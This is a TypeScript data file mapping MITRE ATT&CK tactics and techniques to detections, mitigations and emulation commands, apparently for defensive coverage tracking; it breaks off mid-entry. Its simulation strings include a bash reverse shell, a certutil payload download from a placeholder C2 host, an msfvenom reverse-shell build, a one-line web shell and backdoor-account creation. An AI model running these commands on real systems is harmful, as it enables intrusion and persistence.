import type { ReportListItem } from "./types";

export interface MitreSubTechnique {
  id: string;
  name: string;
  description: string;
  commandSnippet?: string;
  platforms: string[];
}

export interface MitreTechnique {
  id: string;
  name: string;
  tacticId: string;
  tacticName: string;
  description: string;
  platforms: string[];
  subTechniques: MitreSubTechnique[];
  mitigations: string[];
  detections: string[];
  threatActors: string[];
  malware: string[];
  simulationCommands: string[];
  detectionKeywords: string[];
}

export interface MitreTactic {
  id: string;
  name: string;
  shortName: string;
  description: string;
  order: number;
  techniques: MitreTechnique[];
}

export interface MappedSubTechnique extends MitreSubTechnique {
  mappedReports: ReportListItem[];
  coverageCount: number;
}

export interface MappedTechnique extends Omit<MitreTechnique, "subTechniques"> {
  subTechniques: MappedSubTechnique[];
  mappedReports: ReportListItem[];
  coverageCount: number;
  avgSimulationScore: number;
  hasNovelTtp: boolean;
  hasSimulationCommands: boolean;
  userScore?: number;
  userComment?: string;
  customColor?: string;
}

export interface MappedTactic extends Omit<MitreTactic, "techniques"> {
  techniques: MappedTechnique[];
  totalTechniques: number;
  totalSubTechniques: number;
  coveredTechniques: number;
  coveragePercentage: number;
  totalMappedReports: number;
}

export const MITRE_TACTICS_DATA: MitreTactic[] = [
  // 1. RECONNAISSANCE (TA0043)
  {
    id: "TA0043",
    name: "Reconnaissance",
    shortName: "Recon",
    description: "The adversary is trying to gather information they can use to plan future operations.",
    order: 1,
    techniques: [
      {
        id: "T1595",
        name: "Active Scanning",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries execute active reconnaissance to scan victim infrastructure for open ports and vulnerable services.",
        platforms: ["Network", "PRE"],
        mitigations: ["Network Intrusion Prevention", "Pre-compromise Defense"],
        detections: ["Firewall / NetFlow session spikes", "IDS signatures for port scans (Suricata/Snort)"],
        threatActors: ["Volt Typhoon", "APT29", "Lazarus Group"],
        malware: ["Masscan", "Nmap"],
        simulationCommands: ["nmap -sS -p 80,443,8080,8443 target.org", "masscan -p1-65535 192.168.1.0/24 --rate=1000"],
        detectionKeywords: ["nmap", "port scan", "masscan", "active scanning", "banner grabbing", "vulnerability scan"],
        subTechniques: [
          { id: "T1595.001", name: "Scanning IP Blocks", description: "Scanning wide IP blocks to identify responsive hosts.", platforms: ["Network"], commandSnippet: "nmap -sn 192.168.1.0/24" },
          { id: "T1595.002", name: "Vulnerability Scanning", description: "Probing services for specific known CVE vulnerabilities.", platforms: ["Network"], commandSnippet: "nuclei -u https://target.org -t cves/" },
          { id: "T1595.003", name: "Wordlist Scanning", description: "Brute-forcing URL paths, directories, and endpoints.", platforms: ["Network"], commandSnippet: "gobuster dir -u https://target.org -w common.txt" },
        ],
      },
      {
        id: "T1592",
        name: "Gather Victim Host Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries gather host details like operating system versions, software stacks, and configurations.",
        platforms: ["PRE"],
        mitigations: ["Minimize external footprint", "Strip identifying HTTP response headers"],
        detections: ["High volume of probe requests querying version endpoints"],
        threatActors: ["APT28", "Sandworm Team"],
        malware: ["WhatWeb", "Wappalyzer"],
        simulationCommands: ["curl -I https://victim.com", "whatweb https://victim.com"],
        detectionKeywords: ["host info", "server header", "fingerprint host", "software version discovery"],
        subTechniques: [
          { id: "T1592.001", name: "Hardware Info", description: "Gathering hardware specifications.", platforms: ["PRE"] },
          { id: "T1592.002", name: "Software Info", description: "Identifying installed applications and web server versions.", platforms: ["PRE"] },
          { id: "T1592.004", name: "Client Configurations", description: "Identifying browser and OS configs.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1589",
        name: "Gather Victim Identity Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries collect employee names, emails, and credentials from public social media and breach dumps.",
        platforms: ["PRE"],
        mitigations: ["User Training", "Public Data Audits"],
        detections: ["Automated scraping against corporate social channels"],
        threatActors: ["Scattered Spider", "Lapsus$"],
        malware: ["theHarvester", "Holehe"],
        simulationCommands: ["theHarvester -d target.com -b google", "holehe user@target.com"],
        detectionKeywords: ["employee list", "osint identity", "email harvest", "linkedin reconnaissance", "breach dump"],
        subTechniques: [
          { id: "T1589.001", name: "Credentials", description: "Collecting leaked cleartext credentials from paste sites.", platforms: ["PRE"] },
          { id: "T1589.002", name: "Email Addresses", description: "Harvesting email address patterns.", platforms: ["PRE"] },
          { id: "T1589.003", name: "Employee Names", description: "Extracting staff organizational hierarchy.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1590",
        name: "Gather Victim Network Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries collect IP ranges, domain names, DNS records, and network topology.",
        platforms: ["Network", "PRE"],
        mitigations: ["Private WHOIS Registration", "Split DNS"],
        detections: ["Excessive DNS zone transfer attempts (AXFR)"],
        threatActors: ["Volt Typhoon", "APT41"],
        malware: ["DNSRecon", "Amass"],
        simulationCommands: ["whois victim.com", "dnsrecon -d victim.com -t std", "dig axfr @ns1.victim.com victim.com"],
        detectionKeywords: ["whois", "asn lookup", "bgp prefix", "subdomain enumeration", "dnsrecon", "zone transfer"],
        subTechniques: [
          { id: "T1590.001", name: "Domain Properties", description: "Gathering domain registrars and name servers.", platforms: ["PRE"] },
          { id: "T1590.002", name: "DNS Records", description: "Querying MX, TXT, SPF, and CNAME records.", platforms: ["PRE"] },
          { id: "T1590.005", name: "IP Addresses", description: "Identifying allocated public CIDR blocks.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1598",
        name: "Phishing for Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries send deceptive communications to elicit sensitive organizational information.",
        platforms: ["PRE"],
        mitigations: ["User Training", "DMARC / SPF / DKIM Enforcement"],
        detections: ["Inbound email gateway inspection of suspicious recon pretexts"],
        threatActors: ["Midnight Blizzard", "FIN7"],
        malware: ["GoPhish"],
        simulationCommands: ["sendmail -f spoofed@trusted.org -t victim@target.com"],
        detectionKeywords: ["spearphishing recon", "pretexting", "phishing for info", "credential harvesting page"],
        subTechniques: [
          { id: "T1598.001", name: "Spearphishing Service", description: "Sending targeted messages referencing cloud services.", platforms: ["PRE"] },
          { id: "T1598.002", name: "Spearphishing Attachment", description: "Sending benign files to check if macros run.", platforms: ["PRE"] },
          { id: "T1598.003", name: "Spearphishing Link", description: "Sending links to log user IP and user-agent.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1596",
        name: "Search Open Technical Databases",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries query public registries such as certificate transparency, Shodan, and Censys.",
        platforms: ["PRE"],
        mitigations: ["Pre-compromise hygiene"],
        detections: ["Certificate Transparency log monitoring"],
        threatActors: ["Volt Typhoon", "Black Basta"],
        malware: ["Shodan CLI", "Censys CLI"],
        simulationCommands: ["curl -s 'https://crt.sh/?q=%.victim.com&output=json'", "shodan search 'ssl:victim.com'"],
        detectionKeywords: ["shodan", "censys", "crt.sh", "certificate transparency", "zoomeye"],
        subTechniques: [
          { id: "T1596.001", name: "DNS/Passive DNS", description: "Querying historical DNS changes.", platforms: ["PRE"] },
          { id: "T1596.002", name: "WHOIS Databases", description: "Analyzing registrant histories.", platforms: ["PRE"] },
          { id: "T1596.003", name: "Digital Certificates", description: "Searching Certificate Transparency (CT) logs.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1593",
        name: "Search Open Websites/Domains",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries leverage search engines, GitHub repositories, and open websites to discover exposed secrets.",
        platforms: ["PRE"],
        mitigations: ["Automated secret scanning (TruffleHog)"],
        detections: ["Third-party code leak alerts"],
        threatActors: ["Lapsus$", "Scattered Spider"],
        malware: ["Gitrob", "TruffleHog"],
        simulationCommands: ["google-dorks site:victim.com ext:pdf OR ext:docx", "trufflehog github --org=victim"],
        detectionKeywords: ["google dork", "github dork", "pastebin leak", "open web research", "exposed secret"],
        subTechniques: [
          { id: "T1593.001", name: "Social Media", description: "Searching professional networks for employee roles.", platforms: ["PRE"] },
          { id: "T1593.002", name: "Search Engines", description: "Using Google dorking syntax.", platforms: ["PRE"] },
          { id: "T1593.003", name: "Code Repositories", description: "Searching GitHub/GitLab for leaked API keys.", platforms: ["PRE"] },
        ],
      },
    ],
  },

  // 2. RESOURCE DEVELOPMENT (TA0042)
  {
    id: "TA0042",
    name: "Resource Development",
    shortName: "Resource Dev",
    description: "The adversary is trying to establish resources they can use to support operations.",
    order: 2,
    techniques: [
      {
        id: "T1583",
        name: "Acquire Infrastructure",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries register domains, acquire virtual servers, or purchase DNS services.",
        platforms: ["PRE"],
        mitigations: ["Threat Intelligence Feeds", "Domain Reputation Monitoring"],
        detections: ["Newly registered domains (NRDs) queried internally"],
        threatActors: ["FIN7", "Akira", "LockBit"],
        malware: ["Bulletproof Hosting"],
        simulationCommands: ["aws ec2 run-instances --image-id ami-xxxx --instance-type t3.micro"],
        detectionKeywords: ["vps purchase", "domain registration", "bulletproof host", "c2 infrastructure staging"],
        subTechniques: [
          { id: "T1583.001", name: "Domains", description: "Purchasing lookalike domains for typosquatting.", platforms: ["PRE"] },
          { id: "T1583.002", name: "DNS Server", description: "Acquiring authoritative DNS servers for C2 tunneling.", platforms: ["PRE"] },
          { id: "T1583.003", name: "Virtual Private Server", description: "Leasing cloud instances (AWS, DigitalOcean, Linode).", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1584",
        name: "Compromise Infrastructure",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries compromise legitimate third-party websites or DNS records to stage attacks.",
        platforms: ["PRE"],
        mitigations: ["Vulnerability Management", "Web Application Firewalls"],
        detections: ["Unauthorized changes to DNS zone files"],
        threatActors: ["Sandworm", "APT28"],
        malware: ["WordPress Exploits"],
        simulationCommands: ["ssh -i compromised_key user@hijacked-vps.com"],
        detectionKeywords: ["hijacked domain", "compromised website", "seo poisoning staging", "hijacked vps"],
        subTechniques: [
          { id: "T1584.001", name: "Domains", description: "Hijacking legitimate domains via registrar breach.", platforms: ["PRE"] },
          { id: "T1584.004", name: "Server", description: "Compromising vulnerable third-party web servers.", platforms: ["PRE"] },
          { id: "T1584.005", name: "Botnet", description: "Leveraging residential proxy botnets.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1587",
        name: "Develop Capabilities",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries build custom malware, obfuscators, and digital code-signing certs.",
        platforms: ["PRE"],
        mitigations: ["Endpoint Protection", "Code Signing Verification"],
        detections: ["Detection of custom packer signatures"],
        threatActors: ["Lazarus Group", "Black Basta"],
        malware: ["Custom Crypters", "LLVM Obfuscators"],
        simulationCommands: ["msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=c2.com LPORT=443 -f exe"],
        detectionKeywords: ["custom loader", "crypter development", "payload builder", "custom exploit development"],
        subTechniques: [
          { id: "T1587.001", name: "Malware", description: "Authoring bespoke ransomware or backdoor binaries.", platforms: ["PRE"] },
          { id: "T1587.002", name: "Code Signing Certificates", description: "Generating self-signed or stolen driver certs.", platforms: ["PRE"] },
          { id: "T1587.004", name: "Exploits", description: "Engineering 0-day or 1-day exploit modules.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1588",
        name: "Obtain Capabilities",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries buy or download malware, commercial frameworks (Cobalt Strike), or public exploits.",
        platforms: ["PRE"],
        mitigations: ["Threat Hunting", "YARA Rules for Commercial C2"],
        detections: ["Cobalt Strike / Brute Ratel default certificate fingerprints"],
        threatActors: ["Akira", "Black Basta", "Qakbot"],
        malware: ["Cobalt Strike", "Brute Ratel", "Sliver", "Metasploit"],
        simulationCommands: ["git clone https://github.com/adversary-tools/offensive-poc.git"],
        detectionKeywords: ["cobalt strike", "brute ratel", "sliver", "metasploit", "underground marketplace"],
        subTechniques: [
          { id: "T1588.001", name: "Malware", description: "Purchasing Commodity Stealers (RedLine, Lumma).", platforms: ["PRE"] },
          { id: "T1588.002", name: "Tool", description: "Acquiring open-source post-exploitation tools (Mimikatz, Chisel).", platforms: ["PRE"] },
          { id: "T1588.005", name: "Exploits", description: "Procuring exploit code from underground forums.", platforms: ["PRE"] },
        ],
      },
      {
        id: "T1608",
        name: "Stage Capabilities",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries upload payloads to public CDNs, Discord, GitHub, or file hosts.",
        platforms: ["PRE"],
        mitigations: ["Cloud Storage Ingress Restrictions"],
        detections: ["Outbound downloads from unusual Discord/Telegram CDN endpoints"],
        threatActors: ["Agent Tesla", "Lumma Stealer"],
        malware: ["Discord C2", "Pastebin Stagers"],
        simulationCommands: ["curl -T payload.bin https://transfer.sh/stage1.bin"],
        detectionKeywords: ["discord cdn", "github payload host", "pastebin staging", "mega payload host"],
        subTechniques: [
          { id: "T1608.001", name: "Upload Malware", description: "Staging second-stage DLLs on cloud storage.", platforms: ["PRE"] },
          { id: "T1608.003", name: "Install SSL/TLS Certificates", description: "Installing Let's Encrypt certs on C2 listeners.", platforms: ["PRE"] },
          { id: "T1608.005", name: "Link Target", description: "Staging landing pages with redirectors.", platforms: ["PRE"] },
        ],
      },
    ],
  },

  // 3. INITIAL ACCESS (TA0001)
  {
    id: "TA0001",
    name: "Initial Access",
    shortName: "Initial Access",
    description: "The adversary is trying to get into your network.",
    order: 3,
    techniques: [
      {
        id: "T1190",
        name: "Exploit Public-Facing Application",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Exploiting software vulnerabilities in internet-accessible servers (VPN gateways, Exchange, MOVEit).",
        platforms: ["Windows", "Linux", "Network", "Cloud"],
        mitigations: ["Patch Management", "Web Application Firewall", "Network Segmentation"],
        detections: ["Web server process spawning cmd.exe or bash", "Abnormal HTTP POST request patterns"],
        threatActors: ["Volt Typhoon", "Akira", "LockBit"],
        malware: ["WebShells", "MOVEit PoC"],
        simulationCommands: [
          "python3 exploit.py -u https://target-vpn.com/api/v1/session -p payload.sh",
          "curl -X POST https://target.com/web-endpoint -d 'cmd=id'",
        ],
        detectionKeywords: ["cve-202", "public-facing", "remote code execution", "vpn exploit", "moveit", "screenconnect"],
        subTechniques: [],
      },
      {
        id: "T1566",
        name: "Phishing",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Sending malicious attachments, links, or ISO archives to trick end users into executing malware.",
        platforms: ["Windows", "Linux", "macOS", "Office 365"],
        mitigations: ["Email Filtering", "Antivirus / Attachment Sandboxing", "User Awareness Training"],
        detections: ["Email gateway quarantine logs", "User clicking external URL in mail client"],
        threatActors: ["FIN7", "Qakbot", "Emotet"],
        malware: ["Bumblebee", "IcedID", "Pikabot"],
        simulationCommands: [
          "python3 send_spearphish.py --target employee@org.com --attachment Invoice.iso",
        ],
        detectionKeywords: ["phishing attachment", "iso archive", "macro", "malicious link", "qr code phishing", "quishing"],
        subTechniques: [
          { id: "T1566.001", name: "Spearphishing Attachment", description: "Sending weaponized Office documents, PDFs, or ZIPs.", platforms: ["Windows", "macOS"] },
          { id: "T1566.002", name: "Spearphishing Link", description: "Sending links to credential harvesting landing pages.", platforms: ["Windows", "macOS", "Linux"] },
          { id: "T1566.003", name: "Spearphishing via Service", description: "Phishing through Microsoft Teams, Slack, or LinkedIn.", platforms: ["Office 365", "Cloud"] },
        ],
      },
      {
        id: "T1133",
        name: "External Remote Services",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Adversaries leverage exposed remote gateways (RDP, Citrix, SSH, VPN) to connect to internal systems.",
        platforms: ["Windows", "Linux", "Network"],
        mitigations: ["Multi-Factor Authentication (MFA)", "Network Allowlisting", "Disable Public RDP"],
        detections: ["Event ID 4624 (Logon Type 10 - RemoteInteractive) from untrusted external IPs"],
        threatActors: ["Black Basta", "Akira", "LockBit"],
        malware: ["AnyDesk", "RDP Wrapper"],
        simulationCommands: ["xfreerdp /u:Administrator /p:Pass123 /v:victim-gateway.org"],
        detectionKeywords: ["rdp initial access", "exposed rdp", "citrix gateway", "vpn login", "external remote services"],
        subTechniques: [],
      },
      {
        id: "T1078",
        name: "Valid Accounts",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Using legitimate stolen credentials to log into target VPNs, cloud portals, or workstations.",
        platforms: ["Windows", "Linux", "macOS", "Cloud", "Identity"],
        mitigations: ["Phishing-Resistant MFA (FIDO2)", "Privileged Account Management", "Conditional Access"],
        detections: ["Impossible travel sign-in alerts (Entra ID / Okta)", "Logon spikes after hours"],
        threatActors: ["Scattered Spider", "Lapsus$", "Midnight Blizzard"],
        malware: ["Infostealers (RedLine, Lumma)"],
        simulationCommands: ["openvpn --config corporate.ovpn --auth-user-pass stolen_creds.txt"],
        detectionKeywords: ["stolen credentials", "valid accounts", "credential reuse", "compromised vpn account"],
        subTechniques: [
          { id: "T1078.001", name: "Default Accounts", description: "Logging in using vendor factory default passwords.", platforms: ["Linux", "Network"] },
          { id: "T1078.002", name: "Domain Accounts", description: "Using Active Directory domain accounts.", platforms: ["Windows"] },
          { id: "T1078.003", name: "Local Accounts", description: "Using local administrator accounts.", platforms: ["Windows", "Linux"] },
          { id: "T1078.004", name: "Cloud Accounts", description: "Using AWS IAM, Azure Entra ID, or Google Cloud users.", platforms: ["Cloud"] },
        ],
      },
      {
        id: "T1195",
        name: "Supply Chain Compromise",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Manipulating upstream code, dependencies, or hardware before it reaches the customer.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Software Bill of Materials (SBOM)", "Code Integrity Policies"],
        detections: ["Build pipeline integrity checksum mismatches"],
        threatActors: ["APT29", "Lazarus Group"],
        malware: ["SUNBURST", "XZ Backdoor"],
        simulationCommands: ["npm publish compromised-package@1.0.1"],
        detectionKeywords: ["supply chain", "malicious npm", "typosquatting", "upstream compromise", "trojanized dependency"],
        subTechniques: [
          { id: "T1195.001", name: "Compromise Software Dependencies", description: "Injecting malicious code into PyPI/npm packages.", platforms: ["Linux", "Windows"] },
          { id: "T1195.002", name: "Compromise Software Supply Chain", description: "Modifying vendor build pipelines (SolarWinds style).", platforms: ["Windows"] },
        ],
      },
    ],
  },

  // 4. EXECUTION (TA0002)
  {
    id: "TA0002",
    name: "Execution",
    shortName: "Execution",
    description: "The adversary is trying to run malicious code.",
    order: 4,
    techniques: [
      {
        id: "T1059",
        name: "Command and Scripting Interpreter",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Executing commands and scripts via PowerShell, Windows Command Shell (cmd), Python, Bash, or VBScript.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["PowerShell Constrained Language Mode", "Script Block Logging", "Application Whitelisting"],
        detections: ["Process creation with -EncodedCommand, -Exec Bypass, or IEX in command line"],
        threatActors: ["Volt Typhoon", "APT29", "FIN7", "Akira"],
        malware: ["Cobalt Strike", "PowerSploit"],
        simulationCommands: [
          "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgA...",
          "cmd.exe /c start /B certutil.exe -urlcache -split -f http://c2.com/payload.exe",
        ],
        detectionKeywords: ["powershell", "cmd.exe", "wscript", "cscript", "bash -c", "encodedcommand", "command interpreter"],
        subTechniques: [
          { id: "T1059.001", name: "PowerShell", description: "Abusing PowerShell runtime and cmdlets.", platforms: ["Windows"], commandSnippet: "powershell -enc JABhAD0..." },
          { id: "T1059.003", name: "Windows Command Shell", description: "Executing cmd.exe batch routines.", platforms: ["Windows"], commandSnippet: "cmd.exe /c whoami" },
          { id: "T1059.004", name: "Unix Shell", description: "Executing Bash, sh, or zsh scripts.", platforms: ["Linux", "macOS"], commandSnippet: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
          { id: "T1059.005", name: "Visual Basic", description: "Executing VBScript or VBA macros.", platforms: ["Windows"], commandSnippet: "cscript //nologo loader.vbs" },
          { id: "T1059.006", name: "Python", description: "Running standalone Python scripts or PyInstaller payloads.", platforms: ["Linux", "Windows"] },
        ],
      },
      {
        id: "T1047",
        name: "Windows Management Instrumentation",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Using WMI to execute malicious processes locally or across internal network hosts.",
        platforms: ["Windows"],
        mitigations: ["Restrict RPC/DCOM Ports", "User Account Control"],
        detections: ["WmiPrvSE.exe spawning cmd.exe, powershell.exe, or rundll32.exe"],
        threatActors: ["Volt Typhoon", "APT28", "Qakbot"],
        malware: ["WMImplant"],
        simulationCommands: [
          "wmic process call create 'powershell.exe -enc SQBFAFgA...'",
          "wmic /node:192.168.1.100 process call create 'cmd.exe /c whoami'",
        ],
        detectionKeywords: ["wmic process", "wmi execution", "win32_process", "wmic /node"],
        subTechniques: [],
      },
      {
        id: "T1053",
        name: "Scheduled Task/Job",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Using the OS task scheduler (schtasks, cron) to trigger execution at predefined intervals.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Audit Task Scheduler Creation", "Restrict User Privileges"],
        detections: ["Security Event ID 4698 (A scheduled task was created)", "Audit crontab modifications"],
        threatActors: ["Akira", "Black Basta", "Sandworm"],
        malware: ["SystemBC", "Sliver"],
        simulationCommands: [
          "schtasks /create /tn 'SystemHealth' /tr 'C:\\Windows\\Temp\\loader.exe' /sc onlogon /ru SYSTEM",
          "crontab -l; echo '*/10 * * * * /tmp/.stage2' | crontab -",
        ],
        detectionKeywords: ["schtasks", "at.exe", "cron", "scheduled task", "systemd timer"],
        subTechniques: [
          { id: "T1053.003", name: "Cron", description: "Configuring cron jobs on Linux/macOS.", platforms: ["Linux", "macOS"] },
          { id: "T1053.005", name: "Scheduled Task", description: "Using schtasks.exe on Windows systems.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1204",
        name: "User Execution",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Relying on target user action such as opening a malicious shortcut (LNK), ISO, or macro.",
        platforms: ["Windows", "macOS", "Linux"],
        mitigations: ["Block Mark-of-the-Web bypasses", "Disable Office Macros globally"],
        detections: ["Explorer.exe launching LNK files with embedded powershell commands"],
        threatActors: ["Bumblebee", "Qakbot", "Pikabot"],
        malware: ["Malicious LNK", "Weaponized ISO"],
        simulationCommands: ["start C:\\Users\\Public\\Invoice.lnk"],
        detectionKeywords: ["user execution", "malicious link clicked", "macro enabled", "iso mounted", "lnk shortcut"],
        subTechniques: [
          { id: "T1204.001", name: "Malicious Link", description: "User clicking malicious hyperlink.", platforms: ["Windows", "macOS"] },
          { id: "T1204.002", name: "Malicious File", description: "User double-clicking malicious file payload.", platforms: ["Windows", "macOS"] },
        ],
      },
      {
        id: "T1106",
        name: "Native API",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Invoking native operating system APIs directly (NtCreateThread, VirtualAlloc) to bypass command-line auditing.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["EDR Kernel Callbacks", "ETW Ti Auditing"],
        detections: ["Memory allocation with PAGE_EXECUTE_READWRITE without backing file image"],
        threatActors: ["Lazarus Group", "BlackCat"],
        malware: ["Custom Loaders"],
        simulationCommands: ["VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)"],
        detectionKeywords: ["native api", "syscall", "direct syscall", "ntwritevirtualmemory", "virtualallocex"],
        subTechniques: [],
      },
    ],
  },

  // 5. PERSISTENCE (TA0003)
  {
    id: "TA0003",
    name: "Persistence",
    shortName: "Persistence",
    description: "The adversary is trying to maintain their foothold across reboots and disruptions.",
    order: 5,
    techniques: [
      {
        id: "T1547",
        name: "Boot or Logon Autostart Execution",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Configuring Registry Run keys or startup folders to achieve execution upon user sign-in.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Restrict Registry Permissions", "Autoruns Auditing"],
        detections: ["Registry modifications to HKLM/HKCU...\\CurrentVersion\\Run"],
        threatActors: ["APT29", "FIN7", "LockBit"],
        malware: ["Cobalt Strike", "RedLine"],
        simulationCommands: [
          'reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdate /t REG_SZ /d "C:\\Windows\\Temp\\update.exe" /f',
        ],
        detectionKeywords: ["registry run", "currentversion\\run", "runonce", "startup folder", "autostart"],
        subTechniques: [
          { id: "T1547.001", name: "Registry Run Keys / Startup Folder", description: "Writing entries into Run or RunOnce keys.", platforms: ["Windows"] },
          { id: "T1547.004", name: "Winlogon Helper DLL", description: "Modifying Winlogon Userinit or Shell registry keys.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1543",
        name: "Create or Modify System Process",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Installing persistence as a Windows Service, systemd daemon, or launch daemon.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Service Creation Auditing", "Principle of Least Privilege"],
        detections: ["System Event ID 7045 (A new service was installed in the system)"],
        threatActors: ["Volt Typhoon", "Sandworm"],
        malware: ["SystemBC"],
        simulationCommands: ["sc.exe config WinDefend binPath= 'C:\\Windows\\Temp\\persistence.exe'"],
        detectionKeywords: ["service persistence", "launch daemon", "systemd service creation", "sc.exe config"],
        subTechniques: [
          { id: "T1543.002", name: "systemd Service", description: "Creating a unit file in /etc/systemd/system.", platforms: ["Linux"] },
          { id: "T1543.003", name: "Windows Service", description: "Creating a Windows Service via sc.exe create.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1505",
        name: "Server Software Component (Web Shell)",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Planting a web shell or malicious module into an IIS, Tomcat, or web application directory.",
        platforms: ["Windows", "Linux"],
        mitigations: ["File Integrity Monitoring (FIM)", "Read-Only Web Roots"],
        detections: ["W3WP.exe spawning cmd.exe, powershell.exe, or whoami.exe"],
        threatActors: ["Volt Typhoon", "Hafnium", "APT41"],
        malware: ["China Chopper", "Godzilla", "Behinder"],
        simulationCommands: ['echo "<%@ Page Language=\\"Jscript\\" Debug=true%><%eval(Request.Item[\\"cmd\\"]);%>" > web.aspx'],
        detectionKeywords: ["web shell", "webshell", "aspx webshell", "php backdoor", "iis module", "godzilla webshell"],
        subTechniques: [
          { id: "T1505.003", name: "Web Shell", description: "Planting an ASPX, PHP, or JSP script in web root.", platforms: ["Windows", "Linux"] },
          { id: "T1505.004", name: "IIS Components", description: "Installing a native C++ IIS HTTP module.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1136",
        name: "Create Account",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Creating a local or domain user account to maintain persistent administrative access.",
        platforms: ["Windows", "Linux", "Cloud"],
        mitigations: ["Privileged Access Management", "MFA on all Accounts"],
        detections: ["Security Event ID 4720 (A user account was created)"],
        threatActors: ["Akira", "BlackCat"],
        malware: ["Net User Scripts"],
        simulationCommands: ["net user /add backdoor_admin P@ssw0rd123! && net localgroup administrators backdoor_admin /add"],
        detectionKeywords: ["net user /add", "create account", "backdoor user", "shadow admin"],
        subTechniques: [
          { id: "T1136.001", name: "Local Account", description: "Creating a local account with net user /add.", platforms: ["Windows", "Linux"] },
          { id: "T1136.002", name: "Domain Account", description: "Creating an Active Directory domain account.", platforms: ["Windows"] },
          { id: "T1136.003", name: "Cloud Account", description: "Creating an Azure AD or AWS IAM user.", platforms: ["Cloud"] },
        ],
      },
    ],
  },

  // 6. PRIVILEGE ESCALATION (TA0004)
  {
    id: "TA0004",
    name: "Privilege Escalation",
    shortName: "PrivEsc",
    description: "The adversary is trying to gain higher-level permissions.",
    order: 6,
    techniques: [
      {
        id: "T1548",
        name: "Abuse Elevation Control Mechanism (UAC Bypass)",
        tacticId: "TA0004",
        tacticName: "Privilege Escalation",
        description: "Bypassing Windows User Account Control (UAC) to run processes with high integrity without prompting.",
        platforms: ["Windows", "macOS", "Linux"],
        mitigations: ["Set UAC to 'Always Notify'", "Remove Local Admin Rights"],
        detections: ["Registry modifications to ms-settings or fodhelper keys"],
        threatActors: ["FIN7", "Akira", "Black Basta"],
        malware: ["Fodhelper Bypass", "UACMe"],
        simulationCommands: [
          'reg.exe add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /f',
          "fodhelper.exe",
        ],
        detectionKeywords: ["uac bypass", "fodhelper", "sdclt", "eventvwr bypass", "elevation control mechanism"],
        subTechniques: [
          { id: "T1548.002", name: "Bypass User Account Control", description: "Abusing auto-elevating Windows binaries.", platforms: ["Windows"] },
          { id: "T1548.003", name: "Sudo / Sudo Caching", description: "Abusing NOPASSWD sudo directives.", platforms: ["Linux"] },
        ],
      },
      {
        id: "T1055",
        name: "Process Injection",
        tacticId: "TA0004",
        tacticName: "Privilege Escalation",
        description: "Injecting code into legitimate processes (explorer.exe, svchost.exe) to evade defenses and inherit privileges.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Endpoint Detection & Response (EDR)", "Exploit Guard"],
        detections: ["CreateRemoteThread or QueueUserAPC cross-process memory calls"],
        threatActors: ["APT29", "Lazarus", "LockBit"],
        malware: ["Cobalt Strike Beacon", "Donut"],
        simulationCommands: [
          "inject_shellcode.exe --pid 1044 --payload beacon.bin",
        ],
        detectionKeywords: ["process injection", "process hollowing", "early bird apc", "reflective dll", "create remotethread"],
        subTechniques: [
          { id: "T1055.001", name: "Dynamic-link Library Injection", description: "Injecting DLLs into remote memory via LoadLibrary.", platforms: ["Windows"] },
          { id: "T1055.012", name: "Process Hollowing", description: "Unmapping target process memory and replacing with payload.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1068",
        name: "Exploitation for Privilege Escalation",
        tacticId: "TA0004",
        tacticName: "Privilege Escalation",
